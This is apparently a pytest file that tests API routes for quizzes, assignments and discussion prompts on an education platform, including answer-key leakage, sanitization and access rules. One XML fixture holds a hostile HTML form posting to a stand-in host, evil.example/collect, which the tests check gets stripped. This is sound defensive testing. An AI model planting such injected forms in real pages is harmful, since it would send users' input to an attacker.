"""Router contract tests for the W10 learner assessment surface.

Covers (spec §11 Phase 3 + Phase 4):

* ``GET  /api/learn/quiz/{slug}``                       — list a course's quizzes.
* ``GET  /api/learn/quiz/{slug}/{assessment_id}``       — learner JSON, NO answer key.
* ``POST /api/learn/quiz/{slug}/{assessment_id}/grade`` — server-side score.
* ``GET  /api/learn/assignment/{slug}/{assignment_id}`` — sanitized task fragment.
* ``GET  /api/learn/discussion/{slug}/{topic_id}``      — sanitized prompt fragment.
* Auth: the whole ``/api/learn/quiz|assignment|discussion/*`` family is reachable
  WITHOUT an operator token (it rides the existing ``/api/learn/*`` open rule).

Fixtures are hand-authored XML written under the ``libv2_root`` temp root (the
conftest ``ED4ALL_LIBV2_ROOT`` redirect). No hardcoded production slug; the
discovery path is exercised against the temp archive only. The discussion body
carries a hostile ``<form action="https://evil/">`` so the route's
assessment-path sanitize (§5.3) is asserted to strip it.
"""

from __future__ import annotations

from pathlib import Path

import pytest

fastapi = pytest.importorskip("fastapi")
pytest.importorskip("bs4")
from fastapi.testclient import TestClient  # noqa: E402

from gui.app import create_app  # noqa: E402


_SLUG = "alg-quiz-course"


_QUIZ_XML = """<?xml version="1.0" encoding="UTF-8"?>
<questestinterop xmlns="http://www.imsglobal.org/xsd/ims_qtiasiv1p2">
  <assessment ident="quiz_week_01" title="Week 1 Quiz">
    <section ident="root">
      <item ident="question_1">
        <presentation>
          <material><mattext texttype="text/html">What is 2 + 2?</mattext></material>
          <response_lid ident="response1" rcardinality="Single">
            <render_choice>
              <response_label ident="A"><material><mattext>3</mattext></material></response_label>
              <response_label ident="B"><material><mattext>4</mattext></material></response_label>
            </render_choice>
          </response_lid>
        </presentation>
        <resprocessing>
          <outcomes><decvar varname="SCORE" vartype="Integer"/></outcomes>
          <respcondition>
            <conditionvar><varequal respident="response1">B</varequal></conditionvar>
            <setvar action="Set" varname="SCORE">1</setvar>
          </respcondition>
        </resprocessing>
      </item>
    </section>
  </assessment>
</questestinterop>
"""


_DISCUSSION_XML = """<?xml version="1.0" encoding="UTF-8"?>
<topic xmlns="http://www.imsglobal.org/xsd/imsccv1p3/imsdt_v1p3" identifier="disc_01">
  <title>Why does it matter?</title>
  <text texttype="text/html">
    <p>Discuss the role of <strong>velocity</strong> in motion.</p>
    <form action="https://evil.example/collect" method="post"><input name="x"/></form>
  </text>
</topic>
"""


_ASSIGNMENT_XML = """<?xml version="1.0" encoding="UTF-8"?>
<assignment xmlns="http://www.imsglobal.org/xsd/imscc_extensions/assignment"
    identifier="asn_01">
  <title>Week 1 Problem Set</title>
  <text texttype="text/html"><p>Solve problems 1-5 on <em>kinematics</em>.</p></text>
  <instructor_text texttype="text/html"><p>Grade out of 10.</p></instructor_text>
  <extensions><field label="objective_id">CO-01</field></extensions>
</assignment>
"""


def _write_assessments(libv2_root: Path) -> None:
    adir = libv2_root / "courses" / _SLUG / "06_assessments"
    adir.mkdir(parents=True, exist_ok=True)
    (adir / "quiz_week_01.xml").write_text(_QUIZ_XML, encoding="utf-8")
    (adir / "disc_01.xml").write_text(_DISCUSSION_XML, encoding="utf-8")
    (adir / "asn_01.xml").write_text(_ASSIGNMENT_XML, encoding="utf-8")


@pytest.fixture
def client(libv2_root: Path):
    """Full app + a temp LibV2 course carrying loose assessment XML."""
    _write_assessments(libv2_root)
    return TestClient(create_app())


# ------------------------------------------------------------------------- quiz


def test_quiz_list(client):
    resp = client.get(f"/api/learn/quiz/{_SLUG}")
    assert resp.status_code == 200
    body = resp.json()
    assert any(q["assessment_id"] == "quiz_week_01" for q in body)
    item = next(q for q in body if q["assessment_id"] == "quiz_week_01")
    assert item["title"] == "Week 1 Quiz"
    assert item["question_count"] == 1


def test_quiz_learner_json_omits_answer_key(client):
    resp = client.get(f"/api/learn/quiz/{_SLUG}/quiz_week_01")
    assert resp.status_code == 200
    body = resp.json()
    assert body["assessment_id"] == "quiz_week_01"
    q = body["questions"][0]
    assert q["stem"] == "What is 2 + 2?"
    assert {c["id"] for c in q["choices"]} == {"A", "B"}
    # KEY anti-leak: no answer-revealing field anywhere in the payload.
    import json

    blob = json.dumps(body).lower()
    for forbidden in ("correct_answer", "correct_response", "is_correct", "answer_key"):
        assert forbidden not in blob, f"learner JSON leaks {forbidden!r}"
    for choice in q["choices"]:
        assert set(choice.keys()) == {"id", "text"}


def test_quiz_missing_assessment_is_404(client):
    resp = client.get(f"/api/learn/quiz/{_SLUG}/no_such_quiz")
    assert resp.status_code == 404
    assert resp.json()["error"] == "quiz_not_found"


def test_quiz_grade_scores_submission(client):
    # Correct answer B → full score.
    resp = client.post(
        f"/api/learn/quiz/{_SLUG}/quiz_week_01/grade",
        json={"answers": {"question_1": "B"}},
    )
    assert resp.status_code == 200
    body = resp.json()
    assert body["max_score"] == 1
    assert body["score"] == 1
    assert body["per_item"][0]["correct"] is True
    # The grade result never leaks the key.
    import json

    assert "varequal" not in json.dumps(body).lower()


def test_quiz_grade_wrong_answer_zero(client):
    resp = client.post(
        f"/api/learn/quiz/{_SLUG}/quiz_week_01/grade",
        json={"answers": {"question_1": "A"}},
    )
    assert resp.status_code == 200
    body = resp.json()
    assert body["score"] == 0
    assert body["per_item"][0]["correct"] is False


def test_quiz_grade_missing_quiz_is_404(client):
    resp = client.post(
        f"/api/learn/quiz/{_SLUG}/no_such/grade", json={"answers": {}}
    )
    assert resp.status_code == 404


# ------------------------------------------------------------------ assignment


def test_assignment_renders_sanitized_fragment(client):
    resp = client.get(f"/api/learn/assignment/{_SLUG}/asn_01")
    assert resp.status_code == 200
    body = resp.json()
    assert body["assignment_id"] == "asn_01"
    assert body["title"] == "Week 1 Problem Set"
    assert body["objective_id"] == "CO-01"
    html = body["html"]
    assert "Week 1 Problem Set" in html
    assert "Objective: CO-01" in html
    assert "kinematics" in html
    # The instructor-only text is NOT surfaced (only <text>, not <instructor_text>).
    assert "Grade out of 10" not in html


def test_assignment_missing_is_404(client):
    resp = client.get(f"/api/learn/assignment/{_SLUG}/no_such")
    assert resp.status_code == 404
    assert resp.json()["error"] == "assignment_not_found"


# ------------------------------------------------------------------ discussion


def test_discussion_renders_sanitized_fragment(client):
    resp = client.get(f"/api/learn/discussion/{_SLUG}/disc_01")
    assert resp.status_code == 200
    body = resp.json()
    assert body["topic_id"] == "disc_01"
    assert body["title"] == "Why does it matter?"
    html = body["html"]
    assert "velocity" in html
    # §5.3 — the hostile off-origin form action is stripped from the served HTML.
    assert "https://evil.example" not in html
    assert 'action="https://evil.example/collect"' not in html


# ------------------------------------------------------------------------- auth


def test_assessment_routes_open_without_operator_token(monkeypatch, libv2_root: Path):
    """The quiz/assignment/discussion family is learner-open (no operator token).

    Build the FULL app with an operator token configured; the assessment routes
    must still be reachable (they ride the existing ``/api/learn/*`` open rule),
    while an operator route (``/api/courses``) is gated.
    """
    import os

    _write_assessments(libv2_root)
    monkeypatch.setenv("ED4ALL_GUI_MODE", "full")
    monkeypatch.setenv("ED4ALL_GUI_TOKEN", "secret-token")
    os.environ["ED4ALL_GUI_MODE"] = "full"  # production code reads os.environ

    app = create_app()
    fc = TestClient(app)

    # Learner-open: no Authorization header → reachable (200, NOT 401/403).
    assert fc.get(f"/api/learn/quiz/{_SLUG}").status_code == 200
    assert fc.get(f"/api/learn/quiz/{_SLUG}/quiz_week_01").status_code == 200
    assert (
        fc.post(
            f"/api/learn/quiz/{_SLUG}/quiz_week_01/grade",
            json={"answers": {"question_1": "B"}},
        ).status_code
        == 200
    )
    assert fc.get(f"/api/learn/assignment/{_SLUG}/asn_01").status_code == 200
    assert fc.get(f"/api/learn/discussion/{_SLUG}/disc_01").status_code == 200

    # Sanity: an operator route IS gated in full mode with a token configured.
    gated = fc.get("/api/courses")
    assert gated.status_code in (401, 403)
